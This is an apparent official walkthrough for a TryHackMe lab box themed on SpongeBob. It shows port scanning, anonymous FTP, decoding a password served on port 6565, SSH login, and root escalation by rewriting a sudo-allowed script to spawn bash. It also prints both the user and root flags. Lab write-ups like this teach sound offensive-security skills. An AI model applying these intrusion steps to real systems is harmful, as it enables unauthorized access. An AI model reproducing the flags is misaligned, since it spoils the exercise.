Offical writeup for Pineapple Under The Sea, a TryHackMe box.

Author: Jackie Mann
Email: jackiemann82@gmail.com
Alias: whiteshd0w

This is a box based loosely on everybody's favorite sponge that lives under the sea!

***Note: The IP address of your target machine will be different. Replace the IP address shown in the writeup below with the IP address of your target machine***

First we start with our enumeration with nmap:

```bash
nmap -v -sC -sV 10.86.239.126
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 17:20 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating Ping Scan at 17:20
Scanning 10.86.239.126 [2 ports]
Completed Ping Scan at 17:20, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:20
Completed Parallel DNS resolution of 1 host. at 17:20, 0.00s elapsed
Initiating Connect Scan at 17:20
Scanning KrustyKrab (10.86.239.126) [1000 ports]
Discovered open port 21/tcp on 10.86.239.126
Discovered open port 80/tcp on 10.86.239.126
Discovered open port 22/tcp on 10.86.239.126
Discovered open port 6565/tcp on 10.86.239.126
Completed Connect Scan at 17:20, 4.21s elapsed (1000 total ports)
Initiating Service scan at 17:20
Scanning 4 services on KrustyKrab (10.86.239.126)
Completed Service scan at 17:20, 6.03s elapsed (4 services on 1 host)
NSE: Script scanning 10.86.239.126.
Initiating NSE at 17:20
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 17:20, 1.08s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.21s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Nmap scan report for KrustyKrab (10.86.239.126)
Host is up (0.00067s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Sep 06 17:26 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.86.239.137
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:2a:f9:fe:a0:41:3b:68:8b:e5:1a:93:94:46:fb:70 (RSA)
|   256 4a:2c:e6:f5:f9:51:f7:2e:7c:c7:8d:1c:e1:e2:38:85 (ECDSA)
|_  256 81:61:e0:11:51:ef:de:bc:67:f0:1a:ac:a6:67:77:0c (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6565/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    MMZUE5TCNVSGYTCVJJ3FSZ3PHUFA====
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6565-TCP:V=7.80%I=7%D=9/6%Time=5F556098%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20,"MMZUE5TCNVSGYTCVJJ3FSZ3PHUFA====");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
```
We can see that we have an FTP server running that allows anonymous logins. We also have an SSH server, a webserver, and a very odd service running on port 6565 that returned an odd string of text! Let's remember this...

Checking into the webserver we see that, on the surface, it is the basic test page for an Ubuntu Apache installation. However, when you look in the source code for this page you see the following:

```html
...
	<!-- Bob, you REALLY need to change your password! -Patrick --!>
...
```
Hmmm... It looks like we may have picked up on a couple of user names, Bob and Patrick.

Our gobuster enumeration did not find anything else interesting:

```bash
gobuster -x txt,html,php,jpg -w directory-list-2.3-medium.txt -u http://10.86.239.126

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.86.239.126/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,html,php,jpg
[+] Timeout      : 10s
=====================================================
2020/09/06 17:25:22 Starting gobuster
=====================================================
/index.html (Status: 200)
/server-status (Status: 403)
=====================================================
2020/09/06 17:27:47 Finished
=====================================================

```

Let's check out that FTP server. As stated, it will allow anonymous logins. Will we find anything?

```bash
ftp 10.86.239.126
Connected to 10.86.239.126.
220 (vsFTPd 3.0.3)
Name (10.86.239.126:jackie): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 06 17:26 .
drwxr-xr-x    2 ftp      ftp          4096 Sep 06 17:26 ..
-rw-r--r--    1 ftp      ftp            17 Sep 06 17:26 test.txt
226 Directory send OK.
ftp> 
```

If we pull down and look in the test.txt file:

```bash
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.02 secs (0.9947 kB/s)
ftp> quit
221 Goodbye.

cat test.txt
vsftpd test file
```

Oh, barnacles! Nothing interesting here.

Going back to that odd service we found on port 6565, if we try a simple netcat command on that port we get the following:

```bash
nc 10.86.239.126 6565
MMZUE5TCNVSGYTCVJJ3FSZ3PHUFA====
^C
```
This is the same string that nmap picked up on. Could this be encoded? Lets try for base32:

```bash
echo 'MMZUE5TCNVSGYTCVJJ3FSZ3PHUFA====' | base32 -d
c3BvbmdlLUJvYgo=
```

Ok... now it seems that we have another encoded string. Maybe try base64?

```bash
echo 'c3BvbmdlLUJvYgo=' | base64 -d
sponge-Bob
```

Perfect, looks like we got a password!

If we remember the note we found in the webpage, Bob's password REALLY needed to be changed, so let's try to SSH into the box using bob as the username and sponge-Bob as our password:

```bash
ssh bob@10.86.239.126
bob@10.86.239.126's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

New release '18.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Sun Sep  6 21:15:29 2020 from 
bob@KrusyKrab:~$ 
```

SUCCESS! We are now in the box.

Let's look around Bob's folder:

```bash
bob@KrusyKrab:~$ ls -la
total 52
drwxr-xr-x 5 bob  bob  4096 Sep  6 22:56 .
drwxr-xr-x 5 root root 4096 Sep  6 21:23 ..
-rw------- 1 bob  bob   158 Sep  6 21:18 .bash_history
-rw-r--r-- 1 bob  bob   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 bob  bob  3771 Aug 31  2015 .bashrc
drwx------ 2 bob  bob  4096 Sep  6 17:39 .cache
-rw------- 1 bob  bob    33 Sep  6 21:00 creds.txt
drwxrwxr-x 2 bob  bob  4096 Sep  6 20:31 .nano
-rw-r--r-- 1 bob  bob   655 Jul 12  2019 .profile
-rw-rw-r-- 1 bob  bob    66 Sep  6 20:31 .selected_editor
-rwx------ 1 bob  bob    74 Sep  6 20:59 simple_server.sh
drwxr-xr-x 2 bob  bob  4096 Sep  6 03:51 .ssh
-rw------- 1 bob  bob    38 Sep  6 03:51 user.txt
bob@KrustyKrab:~$ 
```
We see our user.txt flag!

```bash
cat user.txt
THM{442a0d0713002cb5e3afe6d54351d234}
```

There is another very interesting file here... simple_server.sh

Let's take a look at what is inside:

```bash
cat simple_server.sh
#!/bin/sh
while true; do printf "$(cat creds.txt)" | netcat -l 6565; done
```
So we can see that this is the serivce that was running on port 6565.

Let's do some more enumeration.

```bash
ls /home
bob  patrick  ubuntu
bob@KrustyKrab:~$ ls -la /home/patrick/
total 36
drwxr-xr-x 5 patrick patrick 4096 Sep  6 21:17 .
drwxr-xr-x 5 root    root    4096 Sep  6 21:23 ..
-rw------- 1 patrick patrick  826 Sep  6 21:24 .bash_history
-rw-r--r-- 1 patrick patrick  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 patrick patrick 3771 Aug 31  2015 .bashrc
drwx------ 2 patrick patrick 4096 Sep  6 21:17 .cache
drwxrwxr-x 2 patrick patrick 4096 Sep  6 17:34 .nano
-rw-r--r-- 1 patrick patrick  655 Jul 12  2019 .profile
drwxr-xr-x 2 patrick patrick 4096 Sep  6 03:51 .ssh
bob@KrustyKrab:~$ ls -la /home/patrick/.ssh
total 8
drwxr-xr-x 2 patrick patrick 4096 Sep  6 03:51 .
drwxr-xr-x 5 patrick patrick 4096 Sep  6 21:17 ..
bob@KrustyKrab:~$ ls /root
ls: cannot open directory '/root': Permission denied
bob@KrustyKrab:~$ sudo -l
[sudo] password for bob: 
Matching Defaults entries for bob on KrustyKrab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on KrustyKrab:
    (root) /home/bob/simple_server.sh

```

So... we can run that simple_server.sh script as root! BIG MISTAKE on Bob's part. Let's overwrite that file and simply call for a bash shell with root privilages!

```bash
bob@KrustyKrab:~$ echo "bash" > simple_server.sh
bob@KrustyKrab:~$ sudo ./simple_server.sh
root@KrustyKrab:~# whoami
root
root@KrustyKrab:~# id
uid=0(root) gid=0(root) groups=0(root)
root@KrustyKrab:~# 
```

Hooray!! We now own the box. Let's move into root's folder and get that flag!

```bash
root@KrustyKrab:~# cd /root
root@KrustyKrab:/root# cat root.txt
VEhNezViOTg5MmUxMjUzZTI3MTlkYmM5MWRmNTY3NDM0ZThifQo=
```

Uh oh, looks like we have another encrypted string. Let's try base64 again:

```bash
root@KrustyKrab:/root# echo "VEhNezViOTg5MmUxMjUzZTI3MTlkYmM5MWRmNTY3NDM0ZThifQo=" | base64 -d
THM{5b9892e1253e2719dbc91df567434e8b}
```
Success!! We now have our root flag!
